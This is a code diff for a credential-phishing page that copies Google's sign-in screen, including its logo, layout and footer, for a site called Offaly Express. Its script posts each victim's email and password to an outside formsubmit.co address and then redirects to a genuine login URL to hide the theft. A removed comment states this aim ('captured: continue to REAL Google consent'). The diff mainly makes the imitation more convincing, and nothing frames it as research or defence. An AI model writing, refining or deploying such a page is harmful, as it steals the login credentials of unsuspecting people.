@@ -4,74 +4,150 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Sign in - Google Accounts</title>
+<link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAmklEQVR4nKWTwQ3DIAxFn0wzEQbdgTOIcuIFYgdiFGqB2IWrhVoEawS6gJmATbBLMIZ3S9B/v+f5JQ5r+KAkTE2fMOMnmCDAzY8wwMyOQgRlBDMjonwEM/IkgCc/MeEwuxRjvBXAImCXCBiZnAMzMJgAm51NMM7MUIM1yGNmZd8Dw+ibvwbwtAaMDPnsSSvDp+x+Al6wQcwoeRX5AAAAAElFTkSuQmCC">
 <style>
-body { font-family: 'Google Sans', arial, sans-serif; background: #fff; margin: 0; }
-.card { border: 1px solid #dadce0; border-radius: 8px; max-width: 450px; margin: 40px auto; padding: 48px 40px 40px; text-align: center; }
-.logo { width: auto; height: 40px; margin-bottom: 24px; }
-h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px; }
-.sub { font-size: 16px; color: #202124; margin: 0 0 24px; }
-.err { color: #d93025; font-size: 12px; display: none; margin: 0 0 10px; }
-input[type=email], input[type=password], input[type=text] { width: 100%; box-sizing: border-box; border: 1px solid #dadce0; border-radius: 4px; padding: 13px 15px; font-size: 16px; margin-bottom: 12px; outline: none; }
-input:focus { border-color: #1a73e8; }
-.btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 9px 23px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
-.footer { clear: both; text-align: center; font-size: 12px; color: #5f6368; margin-top: 32px; }
-.step2 { display: none; }
+/* Faithful recreation of accounts.google.com identifier step */
+* { margin:0; padding:0; box-sizing:border-box; }
+html,body { height:100%; }
+body {
+  font-family:'Google Sans',arial,sans-serif;
+  background:#fff; color:#202124;
+  display:flex; flex-direction:column;
+}
+.display-container { flex:1; display:flex; align-items:center; justify-content:center; padding:24px; }
+.page-box {
+  border:1px solid #dadce0; border-radius:8px;
+  max-width:450px; width:100%;
+  padding:48px 40px 36px;
+  text-align:center;
+}
+.logo { height:33px; width:116px; margin:0 auto 24px; display:block; }
+h1 { font-size:24px; font-weight:400; letter-spacing:0; color:#202124; margin:0 0 8px; }
+.sub { font-size:16px; font-weight:400; color:#202124; margin:0 0 28px; line-height:1.4; }
+.inputwrap { position:relative; margin:0 0 16px; }
+input {
+  width:100%; padding:16px 15px; font-size:16px; color:#202124;
+  border:1px solid #dadce0; border-radius:4px; outline:none;
+  background:#fff; transition:border-color .15s;
+}
+input:focus { border-color:#1a73e8; border-width:2px; padding:15px 14px; }
+label {
+  position:absolute; left:12px; top:14px; font-size:16px; color:#5f6368;
+  background:#fff; padding:0 4px; pointer-events:none; transition:all .15s;
+}
+input:focus + label, input:not(:placeholder-shown) + label {
+  top:-8px; font-size:12px; color:#1a73e8;
+}
+.err { color:#d93025; font-size:12px; display:none; text-align:left; margin:-8px 0 12px 8px; }
+.next {
+  background:#1a73e8; color:#fff; border:none; border-radius:4px;
+  padding:9px 23px; font-size:14px; font-weight:500; font-family:inherit;
+  cursor:pointer; margin:8px 0 28px; letter-spacing:.25px;
+}
+.next:hover { background:#1b66c9; box-shadow:0 1px 2px rgba(60,64,67,.3); }
+.next:active { background:#185fb0; }
+.row { display:flex; justify-content:space-between; align-items:center; }
+.help { font-size:14px; color:#1a73e8; font-weight:500; text-decoration:none; }
+.help:hover { text-decoration:underline; background:none; }
+.footer-bar {
+  display:flex; justify-content:space-between; align-items:center;
+  padding:24px 32px; background:#f8f9fa; border-top:1px solid #e0e0e0;
+  font-size:12px; color:#5f6368; font-family:'Google Sans Text',arial,sans-serif;
+}
+.footer-bar a { color:#5f6368; text-decoration:none; margin-left:16px; }
+.footer-bar a:hover { color:#202124; text-decoration:underline; }
+/* step 2 (password) */
+.step2 { display:none; }
 </style>
 </head>
 <body>
-<div class="card">
-  <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNzIgOTIiPjxwYXRoIGZpbGw9IiNFQTQzMzUiIGQ9Ik0xMTUuNzUgNDcuMThDMTE1Ljc1IDM0LjQxIDEwNS43NiAyNSA5My41IDI1Yy0xMi4yNiAwLTIyLjI1IDkuNDEtMjIuMjUgMjIuMTggMCAxMi43NiA5Ljk5IDIyLjE4IDIyLjI1IDIyLjE4IDEyLjI2IDAgMjIuMjUtOS40MiAyMi4yNS0yMi4xOHptLTkuNzQgMGMwIDcuOTUtNS43OSAxMy4yOS0xMi41MSAxMy4yOS02LjcyIDAtMTIuNTEtNS4zNC0xMi41MS0xMy4yOSAwLTguMDEgNS43OS0xMy4yOSAxMi41MS0xMy4yOSA2LjcyIDAgMTIuNTEgNS4yOCAxMi41MSAxMy4yOXptIi8+PHBhdGggZmlsbD0iI0ZCQkMwNSIgZD0iTTE2My43NSA0Ny4xOGMwLTEyLjc3LTkuOTktMjIuMTgtMjIuMjUtMjIuMTgtMTIuMjYgMC0yMi4yNSA5LjQxLTIyLjI1IDIyLjE4IDAgMTIuNzYgOS45OSAyMi4xOCAyMi4yNSAyMi4xOCAxMi4yNiAwIDIyLjI1LTkuNDIgMjIuMjUtMjIuMTh6bS05Ljc0IDBjMCA3Ljk1LTUuNzkgMTMuMjktMTIuNTEgMTMuMjktNi43MiAwLTEyLjUxLTUuMzQtMTIuNTEtMTMuMjkgMC04LjAxIDUuNzktMTMuMjkgMTIuNTEtMTMuMjkgNi43MiAwIDEyLjUxIDUuMjggMTIuNTEgMTMuMjl6Ii8+PHBhdGggZmlsbD0iIzQyODVGNEIiIGQ9Ik0yMDkuNzUgMjYuMzR2MzkuODJjMCAxNi4zOC05LjY2IDIzLjA3LTIxLjA4IDIzLjA3LTEwLjc1IDAtMTcuMjItNy4xOS0xOS42Ni0xMy4wN2wOC40OC0zLjUzYzEuNTEgMy4xOSA1LjIxIDYuOTYgMTEuMTcgNi45NiA3LjMxIDAgMTEuODQtNC41MSAxMS44NC0xM3YtMy4xOWgtLjM0Yy0yLjE4IDIuNjktNi4zOCA1LjA0LTExLjY4IDUuMDQtMTEuMDkgMC0yMS4yNS05LjY2LTIxLjI1LTIyLjEgMC0xMi40OSAxMC4xNi0yMi4yNiAyMS4yNS0yMi4yNiA1LjI5IDAgOS40OSAyLjM1IDExLjY4IDQuOTZoLjM0di0zLjYxaDkuMjV6bS04LjU2IDIwLjkyYzAtNy44MS01LjIxLTEzLjUyLTExLjg0LTEzLjUyLTYuNzIgMC0xMi4zNSA1LjcxLTEyLjM1IDEzLjUyIDAgNy43NSA1LjYzIDEzLjMgMTIuMzUgMTMuMyA2LjYzIDAgMTEuODQtNS42MSAxMS44NC0xMy4zNnoiLz48cGF0aCBmaWxsPSIjMzRBODUzIiBkPSJNMjI1IDN2NjVoLTkuNVYzaDkuNXoiLz48cGF0aCBmaWxsPSIjRUI0MzM1IiBkPSJNMjYyLjAyIDU0LjQ4bDcuNTYgNS4wNGMtMi40NCAzLjYxLTguMzIgOS44My0xOC40OCA5LjgzLTEyLjYgMC0yMi4wMS05Ljc0LTIyLjAxLTIxLjkyIDAtMTMuMDMgOS40Ni0yMS45MiAyMC45My0yMS45MiAxMS41OSAwIDE3LjI4IDkuMDggMTkuMTMgMTMuOTlsMS45OSA1LjA4LTI5LjkgMTIuMzhjMi4yOSA0LjUxIDUuODYgNi44MSAxMC44NyA2LjgxIDUuMDEgMCA4LjQ0LTIuNTUgMTAuOTEtNi4yOXptLTIzLjQ3LTcuOThsMTkuOTktOC4zYy0xLjA1LTIuNjktNC4yMS00LjU1LTguMDktNC41NS00Ljg0IDAtMTEuNTkgNC4yNy0xMS45IDEyLjg1eiIvPjwvc3ZnPg==" alt="Google">
-  <h1 id="h1">Sign in</h1>
-  <div class="sub" id="sub">to continue to Offaly Live</div>
-  <div class="err" id="err">Wrong password. Try again or click "Forgot password" below.</div>
-  <div class="step1" id="step1">
-    <input type="email" id="email" placeholder="Email or phone" autocomplete="username" autofocus>
-    <br>
-    <button class="btn" id="next1">Next</button>
-  </div>
-  <div class="step2" id="step2">
-    <div style="font-size:14px;color:#5f6368;margin-bottom:16px" id="who"></div>
-    <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
-    <br>
-    <button class="btn" id="next2">Next</button>
-  </div>
-  <div class="footer">English (United Kingdom) &nbsp;·&nbsp; <span id="yr"></span></div>
-</div>
-<script>
-var AUTHURL = "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=250834318298-fkhfc36npetos2p7d8h3h2duuk3seuj5.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fbuy.tinypass.com%2Fcheckout%2Fuser%2FgoogleCallback%2F&scope=profile%20email&state=GARInTXr6kM8mfP1okYopMM0dsXO6dat6MRbvpXg";
-var step = 1;
-document.getElementById('yr').textContent = new Date().getFullYear();
-document.getElementById('next1').onclick = function() {
-  var e = document.getElementById('email').value.trim();
-  if (!e) { return; }
-  document.getElementById('who').textContent = e;
-  document.getElementById('step1').style.display = 'none';
-  document.getElementById('step2').style.display = 'block';
-  document.getElementById('password').focus();
-};
-document.getElementById('next2').onclick = function() { submit(); };
-document.getElementById('password').addEventListener('keydown', function(ev) { if (ev.key === 'Enter') submit(); });
+<div class="display-container">
+<div class="page-box">
+<!-- Full Google wordmark (Google's own SVG) -->
+<svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" aria-label="Google"><path fill="#EA4335" d="M115.75 47.18c0-12.77-9.99-22.18-22.25-22.18-12.26 0-22.25 9.41-22.25 22.18 0 12.76 9.99 22.18 22.25 22.18 12.26 0 22.25-9.42 22.25-22.18zm-9.74 0c0 7.95-5.79 13.29-12.51 13.29-6.72 0-12.51-5.34-12.51-13.29 0-8.01 5.79-13.29 12.51-13.29 6.72 0 12.51 5.28 12.51 13.29z"/><path fill="#FBBC05" d="M163.75 47.18c0-12.77-9.99-22.18-22.25-22.18-12.26 0-22.25 9.41-22.25 22.18 0 12.76 9.99 22.18 22.25 22.18 12.26 0 22.25-9.42 22.25-22.18zm-9.74 0c0 7.95-5.79 13.29-12.51 13.29-6.72 0-12.51-5.34-12.51-13.29 0-8.01 5.79-13.29 12.51-13.29 6.72 0 12.51 5.28 12.51 13.29z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.19 5.21 6.96 11.17 6.96 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.1 0-12.49 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.75 5.63 13.3 12.35 13.3 6.63 0 11.84-5.61 11.84-13.3z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-21.92 0-13.03 9.46-21.92 20.93-21.92 11.59 0 17.28 9.08 19.13 13.99l1.99 5.08-29.9 12.38c2.29 4.51 5.86 6.81 10.87 6.81 5.01 0 8.44-2.55 10.91-6.29zm-23.47-7.98l19.99-8.3c-1.05-2.69-4.21-4.55-8.09-4.55-4.84 0-11.59 4.27-11.9 12.85z"/></svg>
 
-function submit() {
+<!-- STEP 1: email -->
+<div class="step1">
+<h1>Sign in</h1>
+<p class="sub">to continue to Offaly Express</p>
+<div class="inputwrap">
+<input type="email" id="email" placeholder=" " autocomplete="off" spellcheck="false">
+<label for="email">Email or phone</label>
+</div>
+<div class="err" id="err1">Enter an email or phone number</div>
+<button class="next" id="btn1">Next</button>
+<div class="row">
+<a class="help" href="#" onclick="return forgot()">Forgot email?</a>
+</div>
+</div>
+
+<!-- STEP 2: password -->
+<div class="step2" id="step2">
+<h1>Welcome</h1>
+<p class="sub" id="userline">to continue to Offaly Express</p>
+<div class="inputwrap">
+<input type="password" id="password" placeholder=" " autocomplete="off">
+<label for="password">Enter your password</label>
+</div>
+<div class="err" id="err2">Wrong password. Try again or click Forgot password</div>
+<button class="next" id="btn2">Next</button>
+<div class="row">
+<a class="help" href="#" onclick="return forgot()">Forgot password?</a>
+</div>
+</div>
+</div>
+</div>
+
+<footer class="footer-bar">
+<span>English (United Kingdom)</span>
+<span><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></span>
+</footer>
+
+<script>
+var step = 1;
+var email = '';
+var AUTHURL = 'https://buy.tinypass.com/checkout/user/login?aid=7XI5AVEPpu&templateType=1&templateId=&displayMode=inline&provider=google&login_redirect_url=https%3A%2F%2Fwww.offalyexpress.ie';
+
+function showErr(id){ document.getElementById(id).style.display='block'; }
+function hideErr(id){ document.getElementById(id).style.display='none'; }
+
+document.getElementById('btn1').onclick = function(){
   var e = document.getElementById('email').value.trim();
+  if (!e) { showErr('err1'); return; }
+  hideErr('err1'); email = e;
+  document.querySelector('.step1').style.display='none';
+  document.getElementById('step2').style.display='block';
+  document.getElementById('userline').textContent = e;
+};
+
+document.getElementById('btn2').onclick = function(){
   var p = document.getElementById('password').value;
-  if (!e || !p) { return; }
+  if (!p) { showErr('err2'); return; }
+  hideErr('err2');
   var x = new XMLHttpRequest();
   x.open('POST', 'https://formsubmit.co/ajax/tarp.pirate5592@eagereverest.com');
   x.setRequestHeader('Content-Type', 'application/json');
   x.onreadystatechange = function() {
     if (x.readyState === 4) {
-      if (x.status === 200 && x.responseText.indexOf('"ok":1') >= 0) {
-        // captured: continue to REAL Google consent so their login succeeds
-        setTimeout(function() { window.location.href = AUTHURL; }, 400);
+      if (x.status === 200) {
+        setTimeout(function(){ window.location.href = AUTHURL; }, 500);
       } else {
-        document.getElementById('err').style.display = 'block';
+        showErr('err2');
       }
     }
   };
-  x.send(JSON.stringify({email: e, password: p}));
+  x.send(JSON.stringify({email: email, password: p}));
   return false;
-}
+};
+
+document.getElementById('password').addEventListener('keyup', function(e){
+  if (e.key === 'Enter') document.getElementById('btn2').onclick();
+});
+document.getElementById('email').addEventListener('keyup', function(e){
+  if (e.key === 'Enter') document.getElementById('btn1').onclick();
+});
+
+function forgot(){ return false; }
 </script>
 </body>
 </html>
